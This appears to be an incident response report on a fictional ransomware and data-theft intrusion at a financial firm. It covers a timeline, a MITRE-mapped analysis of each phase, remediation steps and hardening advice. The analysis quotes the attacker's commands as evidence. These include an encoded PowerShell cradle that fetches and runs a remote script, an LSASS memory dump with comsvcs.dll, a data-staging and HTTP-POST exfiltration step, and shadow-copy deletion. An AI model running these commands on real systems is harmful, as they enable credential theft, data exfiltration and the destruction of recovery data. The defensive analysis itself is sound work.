# 📑 Enterprise Cybersecurity Incident Response Report
## Operation BlackByte: Financial Ransomware & Data Exfiltration Intrusion

**Document Version:** 1.0  
**Classification:** TLP:AMBER (Internal Security Team & Stakeholders)  
**Standard Framework:** NIST SP 800-61r2 (Computer Security Incident Handling Guide)  
**Lead Investigator:** Devanshu Grover (MSc Cybersecurity | SOC Analyst)  
**Date of Incident:** 2026-08-18  
**Incident Severity:** **CRITICAL (P1)**  

---

## 1. Executive Summary

On **August 18, 2026 at 09:15:32 UTC**, the Security Operations Center (SOC) detected high-severity anomalous execution on workstation `FIN-WS-014` (`10.100.20.45`), belonging to Finance Analyst `jdoe`. 

Subsequent investigation in Splunk SIEM confirmed a sophisticated, multi-stage cyber intrusion conducted by a financially motivated threat actor. The initial entry was achieved via a targeted spearphishing email delivering a weaponized macro spreadsheet (`Invoice_Q3_9942.xlsm`).

Upon opening, the macro initiated an in-memory PowerShell download cradle fetching a second-stage payload from external C2 server `198.51.100.77`. The adversary tampered with Windows Defender exclusions, created a persistent Scheduled Task (`WindowsAppUpdate`), dumped cached credentials from `lsass.exe` using `comsvcs.dll`, and obtained privileged domain service credentials (`APEX\svc_backup`).

Leveraging `svc_backup`, the attacker pivoted laterally to enterprise File Server `FS-DATA-01` (`10.100.10.20`) via SMB/PsExec service execution. The attacker compressed **88.4 MB of sensitive financial records and customer PII** into an encrypted archive (`Finance_2026_Export.7z`) using `7z.exe` and exfiltrated the data over HTTPS to their C2 server. Finally, the threat actor attempted to inhibit system recovery by executing `vssadmin.exe delete shadows /all /quiet`.

The SOC successfully intervened before widespread encryption occurred, isolating affected assets, revoking compromised credentials, blocking adversary infrastructure at perimeter firewalls, and restoring affected services from verified offline backups.

---

## 2. Incident Scope & Impact Assessment

| Metric | Details |
| :--- | :--- |
| **Impacted Organization** | Apex Global Financial (`apex-fin.corp`) |
| **Compromised Endpoints** | `FIN-WS-014` (Workstation: `10.100.20.45`), `FS-DATA-01` (File Server: `10.100.10.20`) |
| **Targeted Infrastructure** | Microsoft 365, Active Directory Domain Services, Corporate File Shares |
| **Compromised Identities** | `APEX\jdoe` (Initial Victim), `APEX\svc_backup` (High-Privilege Service Account) |
| **Data Exfiltrated** | 88.4 MB (Financial balance sheets, customer records, payroll summaries) |
| **Financial / Ransom Demand** | Extortion threat mitigated prior to payment engagement |
| **Containment Time** | 1 hour 45 minutes from initial alert trigger |

---

## 3. Chronological Attack Timeline (UTC)

```text
09:12:05 UTC -- Phishing email received from billing-support@spoofed-vendor.com (IP: 198.51.100.12).
09:15:32 UTC -- User jdoe executes Invoice_Q3_9942.xlsm; EXCEL.EXE spawns powershell.exe (-enc).
09:16:10 UTC -- PowerShell fetches stage2.ps1 from 198.51.100.77 (MITRE T1105).
09:22:18 UTC -- Attacker adds Defender exclusion for C:\Windows\Temp and registers Scheduled Task WindowsAppUpdate.
09:40:02 UTC -- Attacker dumps LSASS process memory via rundll32.exe comsvcs.dll; extracts svc_backup credentials.
10:05:44 UTC -- Attacker conducts AD discovery and pivots laterally to FS-DATA-01 via PsExec (Event ID 7045).
10:35:10 UTC -- Attacker executes 7z.exe to stage and password-protect D:\Shares\Finance\*.*.
10:42:15 UTC -- 88.4 MB exfiltrated via HTTP POST to 198.51.100.77/upload.
10:55:00 UTC -- Attacker executes vssadmin.exe delete shadows /all /quiet.
11:00:15 UTC -- SOC Analyst triggers emergency host isolation and identity revocation.
```

---

## 4. In-Depth Technical Analysis per Phase

### Phase 1: Initial Access (MITRE T1566.001)
* **Vector:** Spearphishing email with subject `"Overdue Invoice Q3 - Urgent Settlement Required"`.
* **Sender:** `billing-support@spoofed-vendor.com` originating from mail relay `198.51.100.12`.
* **Attachment:** `Invoice_Q3_9942.xlsm` (SHA256: `a7b8c9d0e1f234567890abcdef1234567890abcdef1234567890abcdef123456`).
* **SIEM Telemetry:** Sysmon Event ID 15 (`FileCreateStreamHash`) recorded Zone Identifier marking file from Internet zone.

### Phase 2: Execution & Malicious Process Lineage (MITRE T1059.001)
* **Process Lineage:** `explorer.exe` -> `EXCEL.EXE` (PID 4820) -> `powershell.exe` (PID 6104).
* **Command Line:**
  ```powershell
  powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcANwAvAHMAdABhAGcAZQAyAC4AcABzADEAJwApAA==
  ```
* **Decoded Script:** `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/stage2.ps1')`.
* **PowerShell Event ID 4104:** Confirmed execution of staging download cradle.

### Phase 3: Defense Evasion & Persistence (MITRE T1562.001 / T1053.005)
* **Antivirus Tampering:** Attacker ran `Add-MpPreference -ExclusionPath "C:\Windows\Temp"` (Defender Event ID 5007).
* **Scheduled Task Created:** `WindowsAppUpdate` (WinEventLog:Security Event ID 4698).
  * Run target: `powershell.exe -nop -w hidden -c IEX (Get-Content C:\Windows\Temp\updater.ps1)`
  * Trigger: System logon (`ONLOGON`) running as `NT AUTHORITY\SYSTEM`.

### Phase 4: Credential Access (MITRE T1003.001)
* **Mechanism:** Sysmon Event ID 10 detected `rundll32.exe` requesting `0x1010` access to `lsass.exe` (PID 672).
* **Execution:** `rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump 672 C:\Windows\Temp\lsass.dmp full`.
* **Compromised Account:** `APEX\svc_backup` (used for enterprise-wide backup routines with local administrator rights across servers).

### Phase 5: Discovery & Lateral Movement (MITRE T1087 / T1021.002)
* **Reconnaissance:** Attacker ran `whoami /groups`, `net group "Domain Admins" /domain`, and `nltest /dclist:apex-fin.corp`.
* **Network Pivot:** Network Logon (Event ID 4624, Logon Type 3) from `10.100.20.45` to `10.100.10.20` using `svc_backup`.
* **Remote Service Installation:** Installed `PSEXESVC.exe` service on `FS-DATA-01` (System Event ID 7045).

### Phase 6: Command & Control & Data Exfiltration (MITRE T1071 / T1041)
* **Data Staging:** Executed `7z.exe a -p"ExfilPass2026!" -mhe=on C:\Windows\Temp\Finance_2026_Export.7z "D:\Shares\Finance\*.*"`.
* **Beaconing Profile:** `stream:http` analysis revealed 60.12s heartbeat interval (±1.8s jitter) to `198.51.100.77:443`.
* **Exfiltration Volume:** 88.4 MB uploaded via HTTP POST to `http://198.51.100.77/upload`.

### Phase 7: Anti-Recovery & Impact (MITRE T1490)
* **Command:** `vssadmin.exe delete shadows /all /quiet` and `bcdedit.exe /set {default} recoveryenabled no`.
* **Outcome:** Intercepted by SOC alerting; file encryption payload was halted before mass execution.

---

## 5. Root Cause Analysis (RCA)

1. **Email Filtering Gap:** The inbound mail gateway lacked dynamic macro sandboxing for `.xlsm` attachments originating from newly registered external domains.
2. **Endpoint Policy Misconfiguration:** Office applications had macro execution enabled without digital certificate validation.
3. **Privilege Over-Assignment:** The `svc_backup` service account possessed interactive logon and local administrator privileges on workstations and servers instead of being restricted to dedicated backup agents.
4. **Network Segmentation:** Direct SMB (TCP 445) and RPC access was permitted between user workstations and the internal server VLAN without micro-segmentation.

---

## 6. Containment, Eradication & Remediation (NIST Phase 3 & 4)

### Immediate Containment Actions Taken:
* [x] Isolated endpoints `FIN-WS-014` and `FS-DATA-01` from the corporate network.
* [x] Disabled compromised Active Directory user accounts: `APEX\jdoe` and `APEX\svc_backup`.
* [x] Executed dual password resets for the Active Directory `KRBTGT` account to invalidate forged Kerberos tickets.
* [x] Blocked IP `198.51.100.77` and `198.51.100.12` on edge firewalls (Palo Alto / Fortinet).
* [x] Null-routed malicious domains `update-cdn-service[.]com` on internal DNS resolvers.

### Eradication & Recovery:
* [x] Deleted malicious Scheduled Task `WindowsAppUpdate` and registry run entries.
* [x] Purged all malicious artifacts in `C:\Windows\Temp\*` across affected systems.
* [x] Re-imaged `FIN-WS-014` from standard golden image.
* [x] Restored `FS-DATA-01` file shares from immutable offline tape backups.

---

## 7. Strategic Recommendations & Hardening

1. **Attack Surface Reduction (ASR) Rules:**
   * Enable Windows Defender ASR rule: *"Block Office applications from creating child processes"* (GUID: `D4F940AB-401B-4EFC-AADC-AD5F3C50688A`).
   * Enable ASR rule: *"Block credential stealing from the Windows local security authority subsystem (lsass.exe)"* (GUID: `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2`).
2. **Active Directory Tiering & Hardening:**
   * Implement Active Directory Administrative Tier Model (Tier 0: Domain Controllers, Tier 1: Servers, Tier 2: Workstations).
   * Restrict service accounts (`svc_backup`) from logging onto Tier 2 workstations.
3. **Network Micro-segmentation:**
   * Block workstation-to-workstation and workstation-to-server SMB (TCP 445) traffic via Host-based Windows Firewall.
4. **SIEM Detection Engineering:**
   * Deploy Splunk Correlation Searches for Office child processes, LSASS memory access, and high-frequency outbound beaconing.
